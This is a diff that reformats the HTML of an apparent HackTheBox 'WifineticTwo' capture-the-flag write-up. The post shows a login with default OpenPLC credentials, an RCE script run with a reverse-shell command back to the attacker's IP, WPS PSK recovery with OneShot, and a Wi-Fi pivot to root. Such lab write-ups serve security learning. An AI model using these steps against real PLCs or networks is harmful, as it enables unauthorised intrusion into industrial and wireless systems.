@@ -1,1 +1,137 @@
-<html><head><meta charset="utf-8"></head><body><p>We only have ssh and port 8080 open</p><p>Port 8080 is a web page</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:496/587;" src="../img/posts/2024-06-08-WifineticTwo(HTB)/01-f0acef7846.png" width="496" height="587"></figure><p>&nbsp;</p><p>Default creds work</p><p><strong>openplc:openplc</strong></p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:2554/914;" src="../img/posts/2024-06-08-WifineticTwo(HTB)/02-cc0bada176.png" width="2554" height="914"></figure><p>&nbsp;</p><p>&nbsp;</p><p>There is authenticated RCE for PLC 3 but it doesnt work on this machine.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:743/203;" src="../img/posts/2024-06-08-WifineticTwo(HTB)/03-aed6b2cbd3.png" width="743" height="203"></figure><p>&nbsp;</p><p>The script didnt work because the filename in the script was incorrect.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:669/286;" src="../img/posts/2024-06-08-WifineticTwo(HTB)/04-c36479c3fa.png" width="669" height="286"></figure><p>&nbsp;</p><p>Changing this allows us to get a shell.</p><p>python3 rce.py -u http://10.10.11.7:8080 -l openplc -p openplc -i 10.10.14.32 -r 9999</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:593/124;" src="../img/posts/2024-06-08-WifineticTwo(HTB)/05-0261e2b50b.png" width="593" height="124"></figure><p>&nbsp;</p><p>We are root which is interesting but the root directory only has a user.txt file.</p><p>&nbsp;</p><p>We are in a container</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:962/421;" src="../img/posts/2024-06-08-WifineticTwo(HTB)/06-fde0c48aa5.png" width="962" height="421"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>We find another IP address from linpeas which we can ping.</p><p>10.0.3.2</p><p>&nbsp;</p><p>do to the name of this machine it makes sense that wifi is involved. We find a PLC router</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:702/626;" src="../img/posts/2024-06-08-WifineticTwo(HTB)/07-a74c6c7c77.png" width="702" height="626"></figure><p>&nbsp;</p><p>After giving up I looked up a guide and oneshot is supposed to give me the PSK to allow me to connect to this wifi but it wouldnt work for me no matter which tool or how many resets I did. Machine is very broken. I reset the machine, tried oneshot.py tried the C version of oneshot</p><p>https://github.com/kimocoder/OneShot/blob/master/oneshot.py</p><p>&nbsp;</p><p>What oneshot outputs for me</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:576/354;" src="../img/posts/2024-06-08-WifineticTwo(HTB)/08-611cb316c5.png" width="576" height="354"></figure><p>&nbsp;</p><p>What oneshot should output</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:948/718;" src="../img/posts/2024-06-08-WifineticTwo(HTB)/09-400df8a11f.png" width="948" height="718"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Wifi Password NoWWEDoKnowWhaTisReal123!</p><p>&nbsp;</p><p>&nbsp;</p><p>Following this guide we can setup the wifi connection</p><p><a href="https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant">https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant</a></p><p>&nbsp;</p><p>We first setup a <i>wpa_supplicant-wlan0.conf config file.</i></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:520/270;" src="../img/posts/2024-06-08-WifineticTwo(HTB)/10-c85e6e62a7.png" width="520" height="270"></figure><p>We restart the service connecting us to the router</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:942/322;" src="../img/posts/2024-06-08-WifineticTwo(HTB)/11-04e3d7bb13.png" width="942" height="322"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>We set our IP and ssh into the machine and get the root flag</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:725/498;" src="../img/posts/2024-06-08-WifineticTwo(HTB)/12-657da287da.png" width="725" height="498"></figure></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: WifineticTwo | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2024-06-08-WifineticTwo(HTB)/01-f0acef7846.png" alt="HTB: WifineticTwo cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">HTB: WifineticTwo</h1>
+                <div class="post-meta">June 8, 2024 &bull; HTB</div>
+            </div>
+        </header>
+
+        <p>We only have ssh and port 8080 open</p>
+
+        <p>Port 8080 is a web page</p>
+
+        <img alt="Screenshot 1" height="587" src="../img/posts/2024-06-08-WifineticTwo(HTB)/01-f0acef7846.png" style="aspect-ratio:496/587;" width="496"/>
+
+        <p>Default creds work</p>
+
+        <p><strong>openplc:openplc</strong></p>
+
+        <img alt="Screenshot 2" height="914" src="../img/posts/2024-06-08-WifineticTwo(HTB)/02-cc0bada176.png" style="aspect-ratio:2554/914;" width="2554"/>
+
+        <p>There is authenticated RCE for PLC 3 but it doesnt work on this machine.</p>
+
+        <img alt="Screenshot 3" height="203" src="../img/posts/2024-06-08-WifineticTwo(HTB)/03-aed6b2cbd3.png" style="aspect-ratio:743/203;" width="743"/>
+
+        <p>The script didnt work because the filename in the script was incorrect.</p>
+
+        <img alt="Screenshot 4" height="286" src="../img/posts/2024-06-08-WifineticTwo(HTB)/04-c36479c3fa.png" style="aspect-ratio:669/286;" width="669"/>
+
+        <p>Changing this allows us to get a shell.</p>
+
+        <p>python3 rce.py -u http://10.10.11.7:8080 -l openplc -p openplc -i 10.10.14.32 -r 9999</p>
+
+        <img alt="Screenshot 5" height="124" src="../img/posts/2024-06-08-WifineticTwo(HTB)/05-0261e2b50b.png" style="aspect-ratio:593/124;" width="593"/>
+
+        <p>We are root which is interesting but the root directory only has a user.txt file.</p>
+
+        <p>We are in a container</p>
+
+        <img alt="Screenshot 6" height="421" src="../img/posts/2024-06-08-WifineticTwo(HTB)/06-fde0c48aa5.png" style="aspect-ratio:962/421;" width="962"/>
+
+        <p>We find another IP address from linpeas which we can ping.</p>
+
+        <p>10.0.3.2</p>
+
+        <p>do to the name of this machine it makes sense that wifi is involved. We find a PLC router</p>
+
+        <img alt="Screenshot 7" height="626" src="../img/posts/2024-06-08-WifineticTwo(HTB)/07-a74c6c7c77.png" style="aspect-ratio:702/626;" width="702"/>
+
+        <p>After giving up I looked up a guide and oneshot is supposed to give me the PSK to allow me to connect to this wifi but it wouldnt work for me no matter which tool or how many resets I did. Machine is very broken. I reset the machine, tried oneshot.py tried the C version of oneshot</p>
+
+        <p>https://github.com/kimocoder/OneShot/blob/master/oneshot.py</p>
+
+        <p>What oneshot outputs for me</p>
+
+        <img alt="Screenshot 8" height="354" src="../img/posts/2024-06-08-WifineticTwo(HTB)/08-611cb316c5.png" style="aspect-ratio:576/354;" width="576"/>
+
+        <p>What oneshot should output</p>
+
+        <img alt="Screenshot 9" height="718" src="../img/posts/2024-06-08-WifineticTwo(HTB)/09-400df8a11f.png" style="aspect-ratio:948/718;" width="948"/>
+
+        <p>Wifi Password NoWWEDoKnowWhaTisReal123!</p>
+
+        <p>Following this guide we can setup the wifi connection</p>
+
+        <p><a href="https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant">https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant</a></p>
+
+        <p>We first setup a <i>wpa_supplicant-wlan0.conf config file.</i></p>
+
+        <img alt="Screenshot 10" height="270" src="../img/posts/2024-06-08-WifineticTwo(HTB)/10-c85e6e62a7.png" style="aspect-ratio:520/270;" width="520"/>
+
+        <p>We restart the service connecting us to the router</p>
+
+        <img alt="Screenshot 11" height="322" src="../img/posts/2024-06-08-WifineticTwo(HTB)/11-04e3d7bb13.png" style="aspect-ratio:942/322;" width="942"/>
+
+        <p>We set our IP and ssh into the machine and get the root flag</p>
+
+        <img alt="Screenshot 12" height="498" src="../img/posts/2024-06-08-WifineticTwo(HTB)/12-657da287da.png" style="aspect-ratio:725/498;" width="725"/>
+    </article>
+
+</body>
+</html>
